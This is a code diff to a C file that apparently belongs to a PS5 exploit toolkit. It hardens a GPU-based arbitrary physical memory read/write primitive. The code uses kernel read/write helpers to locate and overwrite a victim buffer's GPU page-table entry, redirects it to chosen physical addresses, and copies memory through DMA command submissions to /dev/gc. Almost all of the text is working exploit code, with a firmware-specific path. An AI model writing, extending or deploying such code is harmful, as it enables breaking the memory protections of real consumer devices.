@@ -1,4 +1,6 @@
 #include "gpu.h"
+#include "hv_0250.h"
+#include "util_0250.h"
 #include "utils.h"
 #include <fcntl.h>
 #include <ps5/kernel.h>
@@ -16,13 +18,13 @@ int sceKernelMapNamedDirectMemory(void **va_out, size_t size, int prot,
                                   const char *name);
 int sceKernelSleep(int secs);
 
-static struct gpu_ctx s_gpu = {0};
+static struct gpu_ctx s_gpu = {.fd = -1};
 static struct gpu_kernel_offsets s_gpu_offsets = {0};
 static int s_offsets_set = 0;
 
 struct gpu_ctx *gpu_get_ctx(void) { return &s_gpu; }
 
-void gpu_set_offsets(struct gpu_kernel_offsets *offsets) {
+void gpu_set_offsets(const struct gpu_kernel_offsets *offsets) {
   memcpy(&s_gpu_offsets, offsets, sizeof(s_gpu_offsets));
   s_offsets_set = 1;
 }
@@ -33,25 +35,33 @@ static uint64_t gpu_pde_field(uint64_t pde, int shift, uint64_t mask) {
 
 static int gpu_get_vmid(void) {
   uint64_t curproc = kernel_get_proc(getpid());
-  uint64_t vmspace;
-  uint32_t vmid;
+  uint64_t vmspace = 0;
+  uint32_t vmid = 0;
 
-  kernel_copyout(curproc + s_gpu_offsets.proc_vmspace, &vmspace,
-                 sizeof(vmspace));
-  kernel_copyout(vmspace + s_gpu_offsets.vmspace_vm_vmid, &vmid, sizeof(vmid));
-
-  return (int)vmid;
+  if (!INKERNEL(curproc) ||
+      kernel_copyout(curproc + s_gpu_offsets.proc_vmspace, &vmspace,
+                     sizeof(vmspace)) ||
+      !INKERNEL(vmspace) ||
+      kernel_copyout(vmspace + s_gpu_offsets.vmspace_vm_vmid, &vmid,
+                     sizeof(vmid)))
+    return -1;
+  return vmid < 0x1000 ? (int)vmid : -1;
 }
 
 static uint64_t gpu_get_pdb2_addr(int vmid) {
+  if (vmid < 0)
+    return 0;
   uint64_t gvmspace = KERNEL_ADDRESS_DATA_BASE +
                       s_gpu_offsets.data_base_gvmspace +
                       (uint64_t)vmid * s_gpu_offsets.sizeof_gvmspace;
+  if (!INKERNEL(gvmspace))
+    return 0;
 
-  uint64_t pdb2_va;
-  kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_page_dir_va, &pdb2_va,
-                 sizeof(pdb2_va));
-  return pdb2_va;
+  uint64_t pdb2_va = 0;
+  if (kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_page_dir_va, &pdb2_va,
+                     sizeof(pdb2_va)))
+    return 0;
+  return INKERNEL(pdb2_va) ? pdb2_va : 0;
 }
 
 static uint64_t gpu_get_relative_va(int vmid, uint64_t va) {
@@ -59,12 +69,17 @@ static uint64_t gpu_get_relative_va(int vmid, uint64_t va) {
                       s_gpu_offsets.data_base_gvmspace +
                       (uint64_t)vmid * s_gpu_offsets.sizeof_gvmspace;
 
-  uint64_t start_va, size;
-  kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_start_va, &start_va,
-                 sizeof(start_va));
-  kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_size, &size, sizeof(size));
+  if (vmid < 0 || !INKERNEL(gvmspace))
+    return (uint64_t)-1;
 
-  if (va >= start_va && va < start_va + size)
+  uint64_t start_va = 0, size = 0;
+  if (kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_start_va, &start_va,
+                     sizeof(start_va)) ||
+      kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_size, &size,
+                     sizeof(size)))
+    return (uint64_t)-1;
+
+  if (size && va >= start_va && va - start_va < size)
     return va - start_va;
 
   return (uint64_t)-1;
@@ -73,32 +88,41 @@ static uint64_t gpu_get_relative_va(int vmid, uint64_t va) {
 static uint64_t gpu_walk_pt(int vmid, uint64_t gpu_va,
                             uint64_t *out_page_size) {
   uint64_t pdb2_addr = gpu_get_pdb2_addr(vmid);
+  if (!pdb2_addr)
+    return 0;
 
   uint64_t pml4e_idx = (gpu_va >> 39) & 0x1FF;
   uint64_t pdpe_idx = (gpu_va >> 30) & 0x1FF;
   uint64_t pde_idx = (gpu_va >> 21) & 0x1FF;
 
   // PDB2 (PML4 equivalent)
-  uint64_t pml4e;
-  kernel_copyout(pdb2_addr + pml4e_idx * 8, &pml4e, sizeof(pml4e));
+  uint64_t pml4e = 0;
+  if (kernel_copyout(pdb2_addr + pml4e_idx * 8, &pml4e, sizeof(pml4e)))
+    return 0;
 
   if (gpu_pde_field(pml4e, GPU_PDE_VALID_BIT, 1) != 1)
     return 0;
 
   // PDB1 (PDPT equivalent)
   uint64_t pdp_pa = pml4e & GPU_PDE_ADDR_MASK;
+  if (!pdp_pa || pdp_pa >= GPU_PHYS_ADDR_LIMIT)
+    return 0;
   uint64_t pdpe_va = dmap + pdp_pa + pdpe_idx * 8;
-  uint64_t pdpe;
-  kernel_copyout(pdpe_va, &pdpe, sizeof(pdpe));
+  uint64_t pdpe = 0;
+  if (kernel_copyout(pdpe_va, &pdpe, sizeof(pdpe)))
+    return 0;
 
   if (gpu_pde_field(pdpe, GPU_PDE_VALID_BIT, 1) != 1)
     return 0;
 
   // PDB0 (PD equivalent)
   uint64_t pd_pa = pdpe & GPU_PDE_ADDR_MASK;
+  if (!pd_pa || pd_pa >= GPU_PHYS_ADDR_LIMIT)
+    return 0;
   uint64_t pde_va = dmap + pd_pa + pde_idx * 8;
-  uint64_t pde;
-  kernel_copyout(pde_va, &pde, sizeof(pde));
+  uint64_t pde = 0;
+  if (kernel_copyout(pde_va, &pde, sizeof(pde)))
+    return 0;
 
   if (gpu_pde_field(pde, GPU_PDE_VALID_BIT, 1) != 1)
     return 0;
@@ -221,9 +245,33 @@ static int gpu_submit_commands(int fd, uint32_t pipe_id, uint32_t cmd_count,
   return ioctl(fd, GPU_SUBMIT_IOCTL, &submit);
 }
 
+static int gpu_restore_victim_mapping(void) {
+  int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
+  int prot_rw = prot_ro | PROT_GPU_WRITE;
+  int failed = 0;
+
+  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro))
+    failed = 1;
+  uint64_t original = s_gpu.cleared_ptbe | s_gpu.victim_real_pa;
+  kernel_setlong(s_gpu.victim_ptbe_va, original);
+  if (kernel_getlong(s_gpu.victim_ptbe_va) != original)
+    failed = 1;
+  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw))
+    failed = 1;
+
+  uint64_t final = kernel_getlong(s_gpu.victim_ptbe_va);
+  if ((final & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa ||
+      (final & ~s_gpu.leaf_pa_mask) !=
+          (s_gpu.original_rw_ptbe & ~s_gpu.leaf_pa_mask))
+    failed = 1;
+  return failed ? -1 : 0;
+}
+
 static int gpu_transfer_physical(uint64_t phys_addr, void *local_buf,
                                  uint32_t size, int is_write) {
-  if (!s_gpu.initialized)
+  if (!s_gpu.initialized || !local_buf || !size || size > 0x1fffff ||
+      phys_addr >= GPU_PHYS_ADDR_LIMIT ||
+      size > GPU_PHYS_ADDR_LIMIT - phys_addr)
     return -1;
 
   uint64_t aligned_pa = phys_addr & ~(s_gpu.dmem_size - 1);
@@ -233,16 +281,32 @@ static int gpu_transfer_physical(uint64_t phys_addr, void *local_buf,
     printf("[gpu] transfer exceeds dmem_size\n");
     return -1;
   }
+  if (!s_gpu.leaf_pa_mask || (aligned_pa & ~s_gpu.leaf_pa_mask))
+    return -1;
 
   int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
   int prot_rw = prot_ro | PROT_GPU_WRITE;
 
-  mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro);
+  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro))
+    return -1;
 
   uint64_t new_ptbe = s_gpu.cleared_ptbe | aligned_pa;
   kernel_setlong(s_gpu.victim_ptbe_va, new_ptbe);
+  if (kernel_getlong(s_gpu.victim_ptbe_va) != new_ptbe) {
+    gpu_restore_victim_mapping();
+    return -1;
+  }
 
-  mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw);
+  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw)) {
+    gpu_restore_victim_mapping();
+    return -1;
+  }
+  if ((kernel_getlong(s_gpu.victim_ptbe_va) & s_gpu.leaf_pa_mask) !=
+      aligned_pa) {
+    gpu_restore_victim_mapping();
+    return -1;
+  }
+
   uint64_t src, dst;
 
   if (is_write) {
@@ -256,6 +320,18 @@ static int gpu_transfer_physical(uint64_t phys_addr, void *local_buf,
 
   int cmd_size = pm4_build_dma_data((void *)s_gpu.cmd_va, dst, src, size);
 
+  static uint64_t sequence;
+  uint64_t completion = 0x475055444d410000ULL ^ ++sequence;
+  volatile uint64_t *completion_dst =
+      (volatile uint64_t *)(s_gpu.cmd_va + 0x2000);
+  uint64_t *completion_src = (uint64_t *)(s_gpu.cmd_va + 0x3000);
+  *completion_dst = ~completion;
+  *completion_src = completion;
+  cmd_size += pm4_build_dma_data((void *)(s_gpu.cmd_va + cmd_size),
+                                 s_gpu.cmd_va + 0x2000, s_gpu.cmd_va + 0x3000,
+                                 sizeof(completion));
+  __sync_synchronize();
+
   uint8_t desc[16];
   gpu_build_cmd_descriptor(desc, s_gpu.cmd_va, cmd_size);
 
@@ -265,22 +341,29 @@ static int gpu_transfer_physical(uint64_t phys_addr, void *local_buf,
   int ret = gpu_submit_commands(s_gpu.fd, 0, 1, desc_va);
   if (ret != 0) {
     printf("[gpu] ioctl submit failed: %d\n", ret);
+    gpu_restore_victim_mapping();
     return -1;
   }
 
-  // Wait for GPU DMA completion
-  // TODO: proper fence/signal wait
-  usleep(100000);
-
-  if (!is_write) {
-    memcpy(local_buf, (void *)s_gpu.transfer_va, size);
+  int completed = 0;
+  for (uint32_t wait = 0; wait < 10000; wait++) {
+    __sync_synchronize();
+    if (*completion_dst == completion) {
+      completed = 1;
+      break;
+    }
+    usleep(10);
+  }
+  if (!completed) {
+    printf("[gpu] DMA completion marker timed out\n");
+    gpu_restore_victim_mapping();
+    return -1;
   }
 
-  // Restore victim PTE to original physical address
-  uint64_t orig_ptbe = s_gpu.cleared_ptbe | s_gpu.victim_real_pa;
-  kernel_setlong(s_gpu.victim_ptbe_va, orig_ptbe);
+  if (!is_write)
+    memcpy(local_buf, (void *)s_gpu.transfer_va, size);
 
-  return 0;
+  return gpu_restore_victim_mapping();
 }
 
 int gpu_init(void) {
@@ -303,103 +386,93 @@ int gpu_init(void) {
 }
 
 int gpu_init_internal(void) {
-  if (s_gpu.initialized) {
-    DEBUG_PRINT("[gpu] Already initialized\n");
+  if (s_gpu.initialized)
     return 0;
-  }
 
   if (!s_offsets_set) {
-    DEBUG_PRINT("[gpu] ERROR: call gpu_set_offsets() first\n");
+    printf("[gpu] offsets were not configured\n");
     return -1;
   }
 
-  DEBUG_PRINT("[gpu] init\n");
-
-  s_gpu.dmem_size = 2 * 0x100000; // 2MB
-
-  // Step 1: Open GPU device
-  DEBUG_PRINT("[gpu] Opening /dev/gc\n");
+  s_gpu.dmem_size = 0x200000;
   s_gpu.fd = open("/dev/gc", O_RDWR);
   if (s_gpu.fd < 0) {
-    DEBUG_PRINT("[gpu] ERROR: failed to open /dev/gc (fd=%d)\n", s_gpu.fd);
+    printf("[gpu] failed to open /dev/gc: %d\n", s_gpu.fd);
     return -1;
   }
-  DEBUG_PRINT("[gpu] /dev/gc fd=%d\n", s_gpu.fd);
-
-  // Step 2: Allocate 3 GPU-mapped buffers
-  DEBUG_PRINT("[gpu] Allocating GPU direct memory (3 x 2MB)\n");
 
   s_gpu.victim_va = gpu_alloc_dmem(s_gpu.dmem_size, 1);
-  if (!s_gpu.victim_va) {
-    DEBUG_PRINT("[gpu] victim alloc failed\n");
+  if (!s_gpu.victim_va)
     return -2;
-  }
-
   s_gpu.transfer_va = gpu_alloc_dmem(s_gpu.dmem_size, 1);
-  if (!s_gpu.transfer_va) {
-    DEBUG_PRINT("[gpu] transfer alloc failed\n");
+  if (!s_gpu.transfer_va)
     return -2;
-  }
-
   s_gpu.cmd_va = gpu_alloc_dmem(s_gpu.dmem_size, 1);
-  if (!s_gpu.cmd_va) {
-    DEBUG_PRINT("[gpu] cmd alloc failed\n");
+  if (!s_gpu.cmd_va)
     return -2;
-  }
 
-  DEBUG_PRINT("[gpu] victim_va   = 0x%lx\n", s_gpu.victim_va);
-  DEBUG_PRINT("[gpu] transfer_va = 0x%lx\n", s_gpu.transfer_va);
-  DEBUG_PRINT("[gpu] cmd_va      = 0x%lx\n", s_gpu.cmd_va);
-
-  // Step 3: Get the physical address of the victim buffer
-  s_gpu.victim_real_pa = vtophys_user(s_gpu.victim_va);
-  DEBUG_PRINT("[gpu] victim_real_pa = 0x%lx\n", s_gpu.victim_real_pa);
-
-  // Step 4: Walk GPU page tables to find the PTE for the victim buffer
-  int vmid = gpu_get_vmid();
-  DEBUG_PRINT("[gpu] GPU VMID = %d\n", vmid);
-
-  if (s_gpu_offsets.data_base_gvmspace == 0) {
-    DEBUG_PRINT("[gpu] ERROR: data_base_gvmspace not set\n");
+  uint64_t (*user_pa)(uint64_t) =
+      fw == 0x0250 ? pmap_kextract_0250 : vtophys_user;
+  s_gpu.victim_real_pa = user_pa(s_gpu.victim_va);
+  s_gpu.transfer_real_pa = user_pa(s_gpu.transfer_va);
+  if (!s_gpu.victim_real_pa || (s_gpu.victim_real_pa & 0x1fffff) ||
+      s_gpu.victim_real_pa >= GPU_PHYS_ADDR_LIMIT || !s_gpu.transfer_real_pa ||
+      (s_gpu.transfer_real_pa & 0x1fffff) ||
+      s_gpu.transfer_real_pa >= GPU_PHYS_ADDR_LIMIT ||
+      user_pa(s_gpu.transfer_va + s_gpu.dmem_size - 0x4000) !=
+          s_gpu.transfer_real_pa + s_gpu.dmem_size - 0x4000)
     return -3;
-  }
+
+  int vmid = gpu_get_vmid();
+  if (vmid < 0 || !s_gpu_offsets.data_base_gvmspace)
+    return -3;
 
   uint64_t rel_va = gpu_get_relative_va(vmid, s_gpu.victim_va);
-  if (rel_va == (uint64_t)-1) {
-    DEBUG_PRINT("[gpu] ERROR: could not get relative VA for victim\n");
+  if (rel_va == (uint64_t)-1)
     return -3;
-  }
-  DEBUG_PRINT("[gpu] victim relative GPU VA = 0x%lx\n", rel_va);
 
   s_gpu.victim_ptbe_va = gpu_walk_pt(vmid, rel_va, &s_gpu.page_size);
-  if (s_gpu.victim_ptbe_va == 0) {
-    DEBUG_PRINT("[gpu] ERROR: GPU page table walk failed\n");
+  if (!s_gpu.victim_ptbe_va || s_gpu.page_size != s_gpu.dmem_size)
+    return -4;
+
+  int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
+  int prot_rw = prot_ro | PROT_GPU_WRITE;
+  uint64_t initial_ptbe = 0;
+  if (kernel_copyout(s_gpu.victim_ptbe_va, &initial_ptbe, sizeof(initial_ptbe)))
+    return -4;
+
+  s_gpu.leaf_pa_mask = GPU_PDE_ADDR_MASK & ~(s_gpu.page_size - 1);
+  if ((initial_ptbe & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa ||
+      mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro))
+    return -4;
+
+  uint64_t current_ptbe = 0;
+  if (kernel_copyout(s_gpu.victim_ptbe_va, &current_ptbe,
+                     sizeof(current_ptbe)) ||
+      (current_ptbe & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa) {
+    mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw);
     return -4;
   }
-  DEBUG_PRINT("[gpu] victim GPU PTE VA  = 0x%lx\n", s_gpu.victim_ptbe_va);
-  DEBUG_PRINT("[gpu] victim GPU page sz = 0x%lx\n", s_gpu.page_size);
+  s_gpu.cleared_ptbe = current_ptbe & ~s_gpu.leaf_pa_mask;
 
-  if (s_gpu.page_size != s_gpu.dmem_size) {
-    DEBUG_PRINT("[gpu] WARNING: page size 0x%lx != dmem_size 0x%lx\n",
-                s_gpu.page_size, s_gpu.dmem_size);
-  }
-
-  // Step 5: Prepare the cleared PTE template
-  int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
-  mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro);
-
-  uint64_t current_ptbe;
-  kernel_copyout(s_gpu.victim_ptbe_va, &current_ptbe, sizeof(current_ptbe));
-  s_gpu.cleared_ptbe = current_ptbe & ~s_gpu.victim_real_pa;
-
-  DEBUG_PRINT("[gpu] current PTE = 0x%lx\n", current_ptbe);
-  DEBUG_PRINT("[gpu] cleared PTE = 0x%lx\n", s_gpu.cleared_ptbe);
-
-  int prot_rw = prot_ro | PROT_GPU_WRITE;
-  mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw);
+  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw))
+    return -4;
+  s_gpu.original_rw_ptbe = kernel_getlong(s_gpu.victim_ptbe_va);
+  if ((s_gpu.original_rw_ptbe & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa)
+    return -4;
 
   s_gpu.initialized = 1;
-  DEBUG_PRINT("[gpu] ready\n");
+  uint64_t *victim_word = (uint64_t *)s_gpu.victim_va;
+  uint64_t saved_word = *victim_word;
+  uint64_t pattern = 0x475055524553544fULL;
+  uint64_t readback = 0;
+  *victim_word = pattern;
+  __sync_synchronize();
+  int result = gpu_read_phys(s_gpu.victim_real_pa, &readback, sizeof(readback));
+  *victim_word = saved_word;
+  __sync_synchronize();
+  if (result || readback != pattern)
+    return -4;
   return 0;
 }
 
@@ -484,12 +557,18 @@ void gpu_write_phys8(uint64_t phys_addr, uint64_t value) {
   gpu_transfer_physical(phys_addr, &value, sizeof(value), 1);
 }
 
-void gpu_cleanup(void) {
+int gpu_cleanup_checked(void) {
+  int failed = 0;
+  if (s_gpu.initialized && gpu_restore_victim_mapping())
+    failed = 1;
   if (s_gpu.fd >= 0) {
-    close(s_gpu.fd);
+    if (close(s_gpu.fd))
+      failed = 1;
     s_gpu.fd = -1;
   }
 
   s_gpu.initialized = 0;
-  printf("[gpu] Cleaned up\n");
+  return failed ? -1 : 0;
 }
+
+void gpu_cleanup(void) { (void)gpu_cleanup_checked(); }
